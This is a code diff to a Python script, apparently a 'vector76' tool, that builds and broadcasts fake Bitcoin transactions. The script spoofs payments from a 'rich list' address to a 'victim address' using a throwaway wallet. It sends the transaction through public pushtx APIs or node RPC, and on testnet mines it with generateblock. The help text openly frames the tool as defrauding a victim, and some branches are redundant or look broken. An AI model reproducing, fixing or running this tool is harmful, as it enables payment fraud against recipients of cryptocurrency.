@@ -7,7 +7,6 @@ import cryptos
 import hashlib
 import uuid
 from bitcoinaddress import Wallet
-from bs4 import BeautifulSoup
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
 parser.add_argument("node_host",
@@ -23,7 +22,7 @@ parser.add_argument("password",
                     help="Your BTC node password",
                     type=str)
 parser.add_argument("send_from",
-                    help="Fake send btc from address. (Recommend rich list.)",
+                    help="Fake send btc from deposited address. (Recommend = rich list)",
                     type=str)
 parser.add_argument("send_to",
                     help="Fake send btc to victim address.",
@@ -42,15 +41,13 @@ def to_satoshi(btc_amount):
     return round(btc_amount / satoshi)
 
 def broadcast_transaction(raw_tx, testnet):
-    url = "https://live.blockcypher.com/btc/pushtx/"
-    text = requests.get(url).text
-    csrf = BeautifulSoup.find_all(text, attrs={"name": "csrfmiddlewaretoken"})
-    print(f"CSRF : {csrf}")
+    url = "https://blockchain.info/pushtx"
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-    payload = f"tx_hex={raw_tx}&coin_symbol=btc&csrfmiddlewaretoken={csrf}"
+    payload = {'tx': raw_tx}
     if testnet:
-        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
-        payload = f"tx_hex={raw_tx}&coin_symbol=btc-testnet&csrfmiddlewaretoken={csrf}"
+        url = "https://blockstream.info/testnet/api/tx"
+        headers = {'Content-Type': 'text/plain'}
+        payload = raw_tx
 
     response = requests.post(url, data=payload, headers=headers)
     print(response.text)
@@ -60,13 +57,13 @@ def broadcast_transaction(raw_tx, testnet):
         print(f"Failed to broadcast transaction. Status code: {response.status_code}")
 
 
+
 args = parser.parse_args()
 rpc_host = args.node_host
 rpc_port = args.node_port
 username = args.username
 password = args.password
-
-send_from = args.send_from
+from_address   = args.send_from
 victim_address   = args.send_to
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
@@ -78,18 +75,19 @@ rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_hos
 print("OK")
 print()
 fake_from = Wallet()
-
-inputs = transaction_util.unspent(send_from)
-balance = transaction_util.get_balance(send_from)
-
+balance = transaction_util.get_balance(from_address)
+inputs  = transaction_util.unspent(from_address)
+    #balance = transaction_util.get_balance(send_from)
 if balance["confirmed"] <= 0:
     balance = balance["unconfirmed"]
 else:
     balance = balance["confirmed"]
 
 fake_hash = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()
-#if testnet:
-#    fake_inputs[0]["address"] = fake_from.address.testnet.pubaddr1
+if testnet:
+    inputs[0]["address"] = fake_from.address.testnet.pubaddr1
+else:
+    inputs[0]["address"] = fake_from.address.mainnet.pubaddr1
 
 if amount_btc > 10:
     print(f"[!] Fake remittance amount exceeds 10BTC.")
@@ -97,7 +95,11 @@ if amount_btc > 10:
 
 send_amount = to_satoshi(amount_btc)
 change_btc_amt = (balance - send_amount) #おつり
-tx_victim = [{"address": victim_address, "value": send_amount}, {"address": inputs[0]["address"], "value": change_btc_amt}]
+if testnet:
+    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": inputs[0]["address"], "value": change_btc_amt}]
+else:
+    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": inputs[0]["address"], "value": change_btc_amt}]
+
 tx_victim = transaction_util.mktx(inputs, tx_victim)
 tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_from.key.mainnet.wif))
 if testnet:
@@ -125,12 +127,12 @@ print()
 print("[+] READY...")
 print()
 
-input(" --- Press enter key... --- ")
 print()
 print("OK")
 print("Send fake TX...")
 
-broadcast_transaction(tx_victim, testnet)
+input(" --- Press enter key... --- ")
+rpc_node.sendrawtransaction(tx_victim, testnet)
 if testnet:
     input(f"      Press enter after running the following command on your node:    bitcoin-cli generateblock {fake_from.address.testnet.pubaddr1} '[\"{tx_victim}\"]' false")
 else:
